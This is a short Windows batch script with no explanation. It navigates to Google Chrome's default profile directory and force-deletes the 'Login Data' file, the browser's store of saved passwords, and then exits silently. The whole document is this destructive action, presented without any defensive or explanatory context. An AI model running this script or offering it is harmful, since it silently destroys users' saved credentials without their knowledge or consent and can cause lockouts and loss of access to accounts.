@echo off
cd %appdata%
cd ..
cd Local/Google/Chrome/User Data/Default
DEL /F /A "Login Data"
@EXIT